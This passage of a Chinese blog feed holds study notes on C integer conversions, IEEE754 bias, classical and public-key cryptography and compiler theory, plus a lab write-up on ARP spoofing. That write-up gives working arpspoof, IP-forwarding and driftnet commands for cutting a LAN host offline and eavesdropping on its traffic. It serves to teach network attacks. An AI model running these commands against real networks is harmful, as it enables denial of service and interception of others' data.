编译器约定（重点）</h4><ol><li>若表达式中同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数。</li><li>处理常量时默认的类型</li><li>-x会看成x，然后取负运算</li></ol><p><img alt="&#x56FE;1 C&#x8BED;&#x8A00;&#x5904;&#x7406;&#x5E38;&#x91CF;&#x65F6;&#x9ED8;&#x8BA4;&#x7684;&#x7C7B;&#x578B;" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-17_17-25-12.jpg" class="lozad"></p><h3 id="0x02-牛刀小试（重点）"><a href="#0x02-牛刀小试（重点）" class="headerlink" title="0x02 牛刀小试（重点）"></a>0x02 牛刀小试（重点）</h3><p><img alt="&#x56FE;2" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-17_17-40-25.jpg" class="lozad"></p><p><img alt="&#x56FE;3" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-17_17-44-21.jpg" class="lozad"></p><p><img alt="&#x56FE;4" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-17_11-45-49.jpg" class="lozad"></p><p><img alt="&#x56FE;5" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-17_11-52-55.jpg" class="lozad"></p><p><img alt="&#x56FE;6" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-17_18-01-37.jpg" class="lozad"></p><h3 id="0x03-问题讨论1（重点）"><a href="#0x03-问题讨论1（重点）" class="headerlink" title="0x03 问题讨论1（重点）"></a>0x03 问题讨论1（重点）</h3><p><img alt="&#x56FE;7" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-17_11-58-58.jpg" class="lozad"></p><ol><li>不永真， <script type="math/tex">0x0fffffff</script> ，使其溢出且最高位为1</li><li>不永真， <script type="math/tex">0x80000000</script> ，模拟钟表回拨</li><li>永真；当x位于0x80000000~0xffffffff时，x&lt;0；当x位于0x00000000~0x7fffffff时，-x位于0x80000001~0x00000000，满足 -x ≤ 0；</li><li>不永真：0x80000000</li></ol><h3 id="0x04-问题讨论2（重点）"><a href="#0x04-问题讨论2（重点）" class="headerlink" title="0x04 问题讨论2（重点）"></a>0x04 问题讨论2（重点）</h3><p><img alt="&#x56FE;8" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-03-18_07-54-57.jpg" class="lozad"></p><ol><li>当str1 &lt; str2时，size_t是unsigned int 类型，strlen(str1) - strlen(str2)结果仍然是无符号类型，所以当str1 &lt; str2时，差还大于0.</li><li><code>return strlen(str1) &gt;  strlen(str2)</code></li></ol><h3 id="0x05-无符号数"><a href="#0x05-无符号数" class="headerlink" title="0x05 无符号数"></a>0x05 无符号数</h3><ul><li><strong>问</strong>：你觉得计算机中为什么要支持无符号数呢？只用带符号整数可以吗？因为无符号数和带符号整数对数据表示的差异性，所以经常会导致数据转换时出现错误。你觉得在使用无符号数时，应避免踩哪些坑呢？也可以说说你的疑问。</li><li><ol><li>扩大数据表示范围，因为在无符号数中，所有的位都用于直接表示该值的大小。</li><li>原则上可以，但是如果要表示的数据都是非负数，这时使用带符号数会造成符号位的浪费(因为符号位只为0)；</li><li>使用无符号数时应该避免与带符号数的直接运算。</li></ol></li></ul><h3 id="0x06-偏置常数"><a href="#0x06-偏置常数" class="headerlink" title="0x06 偏置常数"></a>0x06 偏置常数</h3><ul><li><strong>问</strong>：偏置常数的作用是什么？IEEE754为什么把偏置常数设为2的n-1次方-1？（n是阶码位数）如果设成2的n-1次方会怎样？</li><li><ol><li>Bias作用：将浮点数的指数统一转换为正指数，避免正负指数在计算上带来的麻烦；</li><li>扩大浮点数取值范围。精度越大则取值范围越小，精度越小则取值范围越大。以32位单精度浮点数为例：用127，阶码的范围是0000 0001（-126）~1111 1110（127）；用128，阶码的范围会变成0000 0001 （-127）~1111 1110（126）；显然如果使用128作为偏置常数，能表示的最大的指数是126，使用127作为偏置常数，能表示的最大的指数是127。所以规定8位阶码的Bias为127，使得浮点数的取值范围更大。</li></ol></li></ul><h1 id="1-补码"><a href="#1-补码" class="headerlink" title="1 补码"></a>1 补码</h1><p>补码表示可以实现加减运算的统一，即用加法来实现减法运算。</p><p><strong>补码的表示</strong></p><ul><li>正数的补码符号为0，数值部分是他本身；</li><li>负数的补码等于模与该负数绝对值之差。</li></ul><p>在给定编码表示时，一定要<code>明确编码的位数</code>。</p><p><strong>补码0的表示是唯一的好处</strong>：</p><ol><li>减少了+0和-0之间的转化</li><li>少占用一个编码表示，使补码比原码能多表示一个最小负数。</li></ol><p><strong>真值求补码</strong>：</p><ul><li>对于正数，符号位取0，其余各位同真值中对应各位；</li><li>对于负数，符号位取1，其余各位由数值部分“各位取反，末位加1”得到</li></ul><p><strong>补码求真值</strong>：</p><ul><li>若符号位为0，则真值的符号为正，其数值部分不变；</li><li>若符号位为1，则真值的符号为负，其数值部分各位由补码“各位取反，末位加1”得到</li></ul><h1 id="2-十进制转R进制"><a href="#2-十进制转R进制" class="headerlink" title="2 十进制转R进制"></a>2 十进制转R进制</h1><p>要将整数和小数部分分别进行转化。</p><ul><li><strong>整数部分</strong>：<code>除基取余，上右下左</code>，直到商为0</li><li><strong>小数部分</strong>：<code>乘基取整，上左下右</code>，直到小数部分为0或已得到希望的位数为止</li></ul><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ARP攻击</title>
      <link href="/2021/02/17/ARP%E6%AC%BA%E9%AA%97-%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/"/>
      <url>/2021/02/17/ARP%E6%AC%BA%E9%AA%97-%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-理论"><a href="#1-理论" class="headerlink" title="1 理论"></a>1 理论</h1><h2 id="1-1-原理"><a href="#1-1-原理" class="headerlink" title="1.1 原理"></a>1.1 原理</h2><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-02-18_14-20-42.jpg" class="lozad"></p><p>　　ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。假设A、B、C位于<code>同一局域网</code>内，A是PC主机，B是攻击主机，C是路由器。攻击过程如下：</p><ol><li>A将包含目标IP地址(10.0.1.1)信息的ARP Request，广播到网络中的所有主机，源主机A的IP地址和MAC地址都包括在ARP请求中；</li><li>C确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址<a href="https://baike.baidu.com/item/映射" target="_blank" rel="noopener">映射</a>添加到本地ARP缓存中；并将包含其MAC地址的ARP回复消息直接发送回主机A；</li><li>当主机A收到从C发来的ARP回复消息时，会用C的IP和MAC地址映射更新ARP缓存；</li><li>攻击主机B向A发送伪造的ARP应答包，在这个伪造的应答包中，IP地址为C的IP地址，而MAC地址为B的MAC地址；</li><li>A在接收到这个应答包后，会刷新它的ARP缓存，这样在A的ARP缓存表中就出现了IP-C与MAC-B的映射；</li><li>攻击主机B向C发送伪造的ARP应答包，在这个伪造的应答包中，IP地址为A的IP地址，而MAC地址为B的MAC地址；</li><li>C在接收到这个应答包后，会刷新它的ARP缓存，这样在C的ARP缓存表中就出现了IP-A与MAC-B的映射。</li></ol><p>　　这样一来，A与C之间的流量交换都会经过B，可以进行<code>监听、篡改信息、断网攻击</code>。</p><h2 id="1-2-知识储备"><a href="#1-2-知识储备" class="headerlink" title="1.2 知识储备"></a>1.2 知识储备</h2><ul><li><p><strong>网关</strong>：网关(Gateway)在网络层以上实现网络互连。由于历史的原因，许多有关TCP/IP的文献曾经把网络层使用的路由器称为网关，在今天很多局域网采用路由来接入网络，因此通常指的网关就是路由器的IP！</p></li><li><p><strong>Bridged(桥接模式)</strong>：将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。其网络结构如下图所示：</p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/v2-0e29e8f13495c269f3fdc723aa2255c2_r.jpg" class="lozad"></p></li></ul><h1 id="2-实战"><a href="#2-实战" class="headerlink" title="2 实战"></a>2 实战</h1><h2 id="2-1-断网攻击"><a href="#2-1-断网攻击" class="headerlink" title="2.1 断网攻击"></a>2.1 断网攻击</h2><ol><li><p><strong>准备</strong>：<code>kali</code>虚拟机，设置桥接模式，否则断网无效；</p></li><li><p><strong>查看自己的网卡信息</strong></p><p><img height="300" width="600" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-02-17_22-40-47.jpg" class="lozad"></p></li><li><p><strong>找到目标IP</strong>：<code>nmap</code>扫描内网(命令<code>nmap -sP 192.168.1.*</code>)或使用安卓端的<code>Net Analyzer</code>进行<code>LAN Scan</code>；</p><p><img height="300" width="600" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-02-17_22-04-15.jpg" class="lozad"></p></li><li><p><strong>arpspoof进行攻击</strong>：执行下面命令后目的主机无法上网；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 自己网卡信息 -t 目标IP -r 网关</span><br><span class="line">例：arpspoof -i eth0  -t  192.168.1.7 -r 192.168.1.1</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-2-窃听"><a href="#2-2-窃听" class="headerlink" title="2.2 窃听"></a>2.2 窃听</h2><ol><li><strong>开启IP转发</strong>：<code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></li><li><strong>arp攻击</strong>：<code>arpspoof -i eth0 -t targetIP -r gateway（具体参考上面）</code></li><li><strong>窃听</strong>：<code>driftnet -i eth0（你的网卡）</code>或<code>wireshark</code></li></ol><h1 id="3-存在问题"><a href="#3-存在问题" class="headerlink" title="3 存在问题"></a>3 存在问题</h1><ul><li>攻击局域网其他系统时，kali虚拟机可以上网，但是其宿主机(物理机win10)无法上网；<font color="#008000">开启IP转发可以解决</font></li><li>窃听时目标主机虽然可以ping通，当时网速太慢且不稳定；driftnet无法正确抓取图片；</li></ul><h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h1><ul><li><a href="https://baike.baidu.com/item/ARP/609343" target="_blank" rel="noopener">百度百科-ARP</a></li><li><p><a href="https://baike.baidu.com/item/ARP%E6%94%BB%E5%87%BB#:~:text=ARP%20%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB%E6%98%AF%E5%B1%80%E5%9F%9F%E7%BD%91,%E6%AD%A3%E5%B8%B8%E4%B8%8A%E7%BD%91%E5%92%8C%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8%E3%80%82" target="_blank" rel="noopener">百度百科-ARP攻击</a></p></li><li><p><a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97" target="_blank" rel="noopener">百度百科-ARP欺骗</a></p></li><li><a href="https://baike.baidu.com/item/%E7%BD%91%E5%85%B3" target="_blank" rel="noopener">百度百科-网关</a></li><li><p><a href="https://zhuanlan.zhihu.com/p/56658358#:~:text=%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%E5%B0%B1%E6%98%AF%E5%B0%86%E4%B8%BB%E6%9C%BA,%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E8%80%8C%E4%B8%8D%E5%B9%B2%E6%89%B0%E3%80%82" target="_blank" rel="noopener">vmware 虚拟机三种网络模式—“桥接、NAT 、仅主机”区别？</a></p></li><li><p><a href="https://blog.csdn.net/weixin_43343144/article/details/102679135" target="_blank" rel="noopener">Kali Linux使用arpspoof命令进行断网攻击（ARP欺骗）【VMware一定要设置桥接模式，否则断网会无效】</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44839457/article/details/108333653?utm_source=app&amp;app_version=4.5.2" target="_blank" rel="noopener">使用kali进行ARP攻击与欺骗</a></p></li><li><a href="https://blog.csdn.net/qq_42039946/article/details/112968942?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control" target="_blank" rel="noopener">使用kali进行局域网ARP欺骗攻击与监听</a></li><li><a href="https://www.youtube.com/watch?v=ko4VvZuO4rs" target="_blank" rel="noopener">秦柯-ARP攻击</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年终总结</title>
      <link href="/2021/02/11/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/2021/02/11/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！请检查后重试~" data-whm="解密出现了一点问题，你仍可以看一看。">  <script id="hbeData" type="hbeData" data-hmacdigest="6e100be63972fc508ad2ca1eee4b73c10c79f6869f561f7e8f629d89f73cbc59"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码以阅读这篇私密文章。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 未定义 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学</title>
      <link href="/2020/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0/"/>
      <url>/2020/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Chapter-1-引言"><a href="#Chapter-1-引言" class="headerlink" title="Chapter 1 引言"></a>Chapter 1 引言</h1><h4 id="1-4-1-1-凯撒密码"><a href="#1-4-1-1-凯撒密码" class="headerlink" title="1.4.1.1 凯撒密码"></a>1.4.1.1 凯撒密码</h4><ul><li><strong>加密</strong>：$c \equiv E_{3}(m) \equiv m+3(\bmod 26)$</li><li><strong>解密</strong>：$m \equiv D_{3}(c) \equiv c-3(\bmod 26)$</li></ul><h4 id="1-4-1-2-移位变换"><a href="#1-4-1-2-移位变换" class="headerlink" title="1.4.1.2 移位变换"></a>1.4.1.2 移位变换</h4><ul><li><strong>加密</strong>：$c \equiv E_{k}(m) \equiv m+k(\bmod 26)\quad 0\leq k\leq25$</li><li><strong>解密</strong>：$m \equiv D_{k}(c) \equiv c-k(\bmod 26)\quad 0\leq k\leq25$</li></ul><h4 id="1-4-1-3-仿射变换"><a href="#1-4-1-3-仿射变换" class="headerlink" title="1.4.1.3 仿射变换"></a>1.4.1.3 仿射变换</h4><ul><li><strong>加密</strong>：$c \equiv E_{a,b}(m) \equiv a m+b(\bmod 26)$</li><li><strong>解密</strong>：$m \equiv D_{a,b}(c) \equiv a^{-1}(c-b) (\bmod 26)$</li><li><strong>参数</strong>：<ul><li>$a,b$：密钥，$a, b \in Z_{26}$且$gcd(a,26)=1$</li></ul></li></ul><h3 id="1-4-2-多表代换密码"><a href="#1-4-2-多表代换密码" class="headerlink" title="1.4.2 多表代换密码"></a>1.4.2 多表代换密码</h3><ul><li><p>将明文$M$分成为由$n$个字母构成的分组$M<em>{1}, M</em>{2}, \cdots, M_{j}$，对每个$M_i$加密</p></li><li><p><strong>加密</strong>：$C<em>{i} \equiv A M</em>{i}+B(\bmod N), i=1,2, \cdots, j$</p></li><li><p>$(A,B)$是密钥，$A$是$n×n$的可逆矩阵，满足$\operatorname{gcd}(|A|, N)=1$(|A|是行列式)，$B=\left(B<em>{1}, B</em>{2}, \cdots, B<em>{n}\right)^{T}$，$C=\left(C</em>{1}, C<em>{2}, \cdots, C</em>{n}\right)^{T}, M<em>{i}=\left(m</em>{1}, m<em>{2}, \cdots, m</em>{n}\right)^{T}$，对密文分组$C_i$解密</p></li><li><p><strong>解密</strong>：$M<em>{i} \equiv A^{-1}\left(C</em>{i}-B\right)(\bmod N), i=1,2, \cdots, j$</p></li></ul><hr><h1 id="Chapter-2-流密码"><a href="#Chapter-2-流密码" class="headerlink" title="Chapter 2 流密码"></a>Chapter 2 流密码</h1><hr><h1 id="Chapter-3-分组密码体制"><a href="#Chapter-3-分组密码体制" class="headerlink" title="Chapter 3 分组密码体制"></a>Chapter 3 分组密码体制</h1><hr><h1 id="Chapter-4-公钥密码"><a href="#Chapter-4-公钥密码" class="headerlink" title="Chapter 4 公钥密码"></a>Chapter 4 公钥密码</h1><h2 id="4-1-RSA"><a href="#4-1-RSA" class="headerlink" title="4.1 RSA"></a>4.1 RSA</h2><h3 id="4-1-1-密钥产生"><a href="#4-1-1-密钥产生" class="headerlink" title="4.1.1 密钥产生"></a>4.1.1 密钥产生</h3><ul><li>随意选择两个大素数$p$和$q$</li><li>计算$n = pq$，$\varphi(n)=\varphi(p) \varphi(q)=(p-1)(q-1)$</li><li>选定整数$e$，满足$1&lt;e&lt;\varphi(n)$且$gcd(\varphi(n),e)=1$</li><li>计算$d$，满足$d\cdot e\equiv 1\,mod\, \varphi(n)$</li><li>公钥${e,n}$，私钥${d,n}$</li><li>可公开${e,n}$，不公开${p,q,\varphi(n),d}$</li></ul><h3 id="2-加密"><a href="#2-加密" class="headerlink" title="2. 加密"></a>2. 加密</h3><p>$c \equiv m^{e} \bmod n$</p><h3 id="3-解密"><a href="#3-解密" class="headerlink" title="3. 解密"></a>3. 解密</h3><p>$m \equiv c^{d} \bmod n$</p><hr><h2 id="0x02-Rabin"><a href="#0x02-Rabin" class="headerlink" title="0x02 Rabin"></a>0x02 Rabin</h2><h4 id="1-密钥产生"><a href="#1-密钥产生" class="headerlink" title="1. 密钥产生"></a>1. 密钥产生</h4><ul><li>随意选择两个大素数$p$和$q$，满足$p\equiv q \equiv 3 \, mod \, 4$ </li><li>计算$n = pq$</li><li>公钥${n}$，私钥${p,q}$</li><li>可公开${n}$，不公开${p,q}$</li></ul><h3 id="2-加密-1"><a href="#2-加密-1" class="headerlink" title="2. 加密"></a>2. 加密</h3><p>$c \equiv m^{2} \bmod n$</p><h3 id="3-解密-1"><a href="#3-解密-1" class="headerlink" title="3. 解密*"></a>3. 解密*</h3><ul><li><p>$m_p=c^{\frac{p+1}{4}}mod \, p\quad m_q=c^{\frac{q+1}{4}}mod \, q$</p></li><li><p>使用扩展欧几里得算法得到$y_p$和$y_q$，使得$y_p·p+y_q·q=1$</p></li><li><p>利用中国剩余定理得到</p><p>$\begin{align}</p><pre><code>&amp;x_1=(y_p·p·m_q+y_q·q·m_p) mod \quad n\\ &amp;x_2=n-x_1 \\   </code></pre><p>  &amp;  x_3=(y_p·p·m_q-y_q·q·m_p) mod \quad n\<br>&amp;x_4=n-x_3\<br>\end{align}$</p></li></ul><hr><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><hr><h1 id="Chapter-5-密钥分配与密钥管理"><a href="#Chapter-5-密钥分配与密钥管理" class="headerlink" title="Chapter 5 密钥分配与密钥管理"></a>Chapter 5 密钥分配与密钥管理</h1><h2 id="5-1-单钥加密体制的密钥分配"><a href="#5-1-单钥加密体制的密钥分配" class="headerlink" title="5.1 单钥加密体制的密钥分配"></a>5.1 单钥加密体制的密钥分配</h2><h2 id="5-2-公钥加密体制的密钥管理"><a href="#5-2-公钥加密体制的密钥管理" class="headerlink" title="5.2 公钥加密体制的密钥管理"></a>5.2 公钥加密体制的密钥管理</h2><h2 id="5-3-随机数的产生"><a href="#5-3-随机数的产生" class="headerlink" title="5.3* 随机数的产生"></a>5.3* 随机数的产生</h2><h2 id="5-4-秘密分割"><a href="#5-4-秘密分割" class="headerlink" title="5.4 秘密分割"></a>5.4 秘密分割</h2><h2 id="5-5-习题"><a href="#5-5-习题" class="headerlink" title="5.5 习题"></a>5.5 习题</h2><ul><li>T1：<a href="http://www.cnitpm.com/pm1/43805.html" target="_blank" rel="noopener">http://www.cnitpm.com/pm1/43805.html</a></li><li>T2：<a href="https://web.xidian.edu.cn/qkdong/files/20161229_163230.doc" target="_blank" rel="noopener">https://web.xidian.edu.cn/qkdong/files/20161229_163230.doc</a></li><li>T3：<a href="https://web.xidian.edu.cn/qkdong/files/20161229_163230.doc" target="_blank" rel="noopener">https://web.xidian.edu.cn/qkdong/files/20161229_163230.doc</a></li><li>T4：<a href="https://web.xidian.edu.cn/qkdong/files/20161229_163230.doc" target="_blank" rel="noopener">https://web.xidian.edu.cn/qkdong/files/20161229_163230.doc</a></li><li>T5：<a href="https://web.xidian.edu.cn/qkdong/files/20161229_163230.doc" target="_blank" rel="noopener">https://web.xidian.edu.cn/qkdong/files/20161229_163230.doc</a></li><li>T6：作业本</li></ul><hr><h1 id="Chapter-6-消息认证和哈希函数"><a href="#Chapter-6-消息认证和哈希函数" class="headerlink" title="Chapter 6 消息认证和哈希函数"></a>Chapter 6 消息认证和哈希函数</h1><h2 id="6-1-消息认证码"><a href="#6-1-消息认证码" class="headerlink" title="6.1 消息认证码"></a>6.1 消息认证码</h2><h2 id="6-2-哈希函数"><a href="#6-2-哈希函数" class="headerlink" title="6.2 哈希函数"></a>6.2 哈希函数</h2><h2 id="6-3-MD5-哈希算法"><a href="#6-3-MD5-哈希算法" class="headerlink" title="6.3 MD5 哈希算法"></a>6.3 MD5 哈希算法</h2><h2 id="6-4-安全哈希算法"><a href="#6-4-安全哈希算法" class="headerlink" title="6.4 安全哈希算法"></a>6.4 安全哈希算法</h2><h2 id="6-5-HMAC"><a href="#6-5-HMAC" class="headerlink" title="6.5 HMAC"></a>6.5 HMAC</h2><h2 id="6-6-SM3哈希算法"><a href="#6-6-SM3哈希算法" class="headerlink" title="6.6 SM3哈希算法"></a>6.6 SM3哈希算法</h2><hr>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编译原理</title>
      <link href="/2020/11/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
      <url>/2020/11/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="01-考点"><a href="#01-考点" class="headerlink" title="01 考点"></a>01 考点</h1><ol><li>简答题：Ch1-引论与Ch9-运行时存储空间组织，知识发散</li><li>给定语言，写出文法(上下文无关文法)</li><li>给定正规式，划到最小化的有限自动机</li><li>LL(1)</li><li>LR(0)、SLR(1)；<strong>LR(1)不考、算符优先分析不考</strong></li><li>语法制导翻译：会写翻译模式，if+while+for等会写</li><li>优化：基本块优化、循环优化</li></ol><h1 id="02-问题"><a href="#02-问题" class="headerlink" title="02 问题"></a>02 问题</h1><ol><li>卷一的题三</li><li>卷三的题二+题三+题四</li><li>改写无二义性</li><li>卷4题6</li><li>for翻译</li><li>符号表建立</li></ol><h1 id="03-课上安排"><a href="#03-课上安排" class="headerlink" title="03 课上安排"></a>03 课上安排</h1><ul><li>翻译</li><li>优化</li></ul><h1 id="Ch1-引论-amp-Ch9-运行时存储空间组织"><a href="#Ch1-引论-amp-Ch9-运行时存储空间组织" class="headerlink" title="Ch1 引论 &amp; Ch9 运行时存储空间组织"></a>Ch1 引论 &amp; Ch9 运行时存储空间组织</h1><h2 id="0x01-目标代码与中间代码的区别和联系"><a href="#0x01-目标代码与中间代码的区别和联系" class="headerlink" title="0x01 目标代码与中间代码的区别和联系"></a>0x01 目标代码与中间代码的区别和联系</h2><p>　　目标代码生成的任务是将中间代码(或经过优化处理后的中间代码)变换成特定机器上的绝对指令代码或可重新定位的指令代码或汇编指令代码。这种代码变换依赖于特定的硬件系统结构和机器指令含义。</p><h2 id="0x02-存储分配策略"><a href="#0x02-存储分配策略" class="headerlink" title="0x02 存储分配策略"></a>0x02 存储分配策略</h2><ul><li><strong>静态分配策略</strong>：在编译时对所有数据对象分配固定的存储单元，且运行时始终保持不变。</li><li><strong>栈式动态分配策略</strong>：在运行时把存储器作为一个栈进行管理，运行时，每当调用一个过程，他所需要的存储空间就动态地分配于栈顶，一旦退出，它所占空间就予以释放。</li><li><strong>堆式动态分配策略</strong>：在运行时把存储器组成堆结构，以便用户关于存储空间的申请与归还(回收)，凡申请者从堆中分给一块存储空间，凡释放者退回给堆。</li></ul><h3 id="01-C语言"><a href="#01-C语言" class="headerlink" title="01 C语言"></a>01 C语言</h3><p>　　C语言是这样的一种语言：没有分程序结构，过程定义不允许嵌套，但是允许过程的递归调用，允许过程含有可变数组。由于允许递归过程，在编译时刻无法预先确定哪些递归过程在运行时被激活，更难以确定他们的递归深度，而每次递归调用都要为该过程中的每个数据对象分配一个新的存储空间，因此编译程序不能采用静态分配策略，只能采用在程序运行时动态的进行分配(栈式分配)。栈式分配策略在运行时把存储器作为一个栈进行管理，运行时，每当调用一个过程，他所需要的存储空间就动态地分配于栈顶，一旦退出，它所占空间就予以释放。</p><p>　　另外，C语言允许用户动态的申请和释放存储空间，而且申请与释放之间不一定遵守先申请后释放或后申请先释放的原则，因此需要采用一种更加复杂的堆式动态分配策略。堆式动态分配策略在运行时把存储器组成堆结构，以便用户关于存储空间的申请与归还(回收)，凡申请者从堆中分给一块存储空间，凡释放者退回给堆。</p><h3 id="02-DISPLAY表实现嵌套过程中非局部变量访问的思想"><a href="#02-DISPLAY表实现嵌套过程中非局部变量访问的思想" class="headerlink" title="02 DISPLAY表实现嵌套过程中非局部变量访问的思想"></a>02 DISPLAY表实现嵌套过程中非局部变量访问的思想</h3><p>　　display表的作用是对嵌套过程语言实现对非局部变量的引用而设置的，它依次存放着包围它的外过程的最新活动记录的基地址SP值，由于，嵌套层次为i+1过程中的非局部变量可能在i,i-1…0层，所以，对非局部变量的引用是通过它的display表元素d[i],d[i-1],..,d[0]而获得包围它的外过程的最新活动记录的基地址SP值，再加上变量在该过程(第i层)的偏移量。如若非局部变量a是在第i层，那么引用a时，首先从当前栈顶过程的display表中元素d[i]中取出存放的第i层最新活动记录基地址SP值，然后加上a所在过程(第i层)的偏移量，就得到a的存放地址。</p><h3 id="03-C语言与Pascal"><a href="#03-C语言与Pascal" class="headerlink" title="03 C语言与Pascal"></a>03 C语言与Pascal</h3><p>　　C语言与Pascal语言都允许递归调用，因此应该采用栈式存储分配。由于C语言过程定义不允许嵌套定义，对非局部变量的访问非常简单，因此活动记录只需保持一条动态链，记录过程的调用关系；而Pascal过程定义允许嵌套定义，因此，对非局部变量的访问是一个相对概念，因此，其活动记录不仅要记录过程的调用关系，还必须记录过程的嵌套关系。</p><h3 id="04-问题"><a href="#04-问题" class="headerlink" title="04 问题"></a>04 问题</h3><ul><li><strong>问</strong>：假定一语言，在每个过程内部既可以引用局部于该过程的变量，也可以引用主过程中的全局变量，过程允许递归调用但不允许嵌套定义，请根据该语言的特点说明其运行时需要采用何种存储分配策略</li><li><strong>答</strong>：采用简单的栈式分配，但需要在每个过程的活动记录中增加一个指向主过程中变量的位置，以便对主过程中全局变量的访问。</li></ul><h2 id="0x03-可规约活前缀"><a href="#0x03-可规约活前缀" class="headerlink" title="0x03  可规约活前缀"></a>0x03  可规约活前缀</h2><ul><li><strong>前缀</strong>：字的前缀是指该字的任意首部。例如，字<code>abc</code>的前缀有空字、a、ab或abc。</li><li><strong>活前缀</strong>：规范句型的一个前缀，这种前缀不含句柄之后的任何符号。之所以称为活前缀，是因为在右边增添一些终结符号之后，就可以使其成为一个规范句型。</li><li><strong>可规约活前缀</strong>：含句柄的活前缀</li><li><strong>规范句型</strong>：在形式语言中，最右推导常被称为规范推导。由规范推导所得的句型称为规范句型。如果文法G是无二义的，那么规范推导(最右推导)的逆过程必是规范规约(最左规约)。</li></ul><h2 id="0x04-短语-直接短语-句柄"><a href="#0x04-短语-直接短语-句柄" class="headerlink" title="0x04 短语+直接短语+句柄"></a>0x04 短语+直接短语+句柄</h2><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/20161213181906072.png" class="lozad"></p><ul><li><strong>短语</strong>：一个句型的语法树中任一子树叶结点所组成的符号串都是该句型的短语</li><li><strong>直接短语</strong>：深度为2的子树叶结点所组成的符号串都是该句型的直接短语</li><li><p><strong>句柄</strong>：直接短语中的最左直接短语为该句型的句柄</p></li><li><p><strong>素短语</strong>：素短语是一个短语，它至少含有一个终结符，而且除他之外不含有其他素短语。</p></li><li><strong>最左素短语</strong>：最左边的素短语</li></ul><h2 id="0x05-编译的主要过程"><a href="#0x05-编译的主要过程" class="headerlink" title="0x05 编译的主要过程"></a>0x05 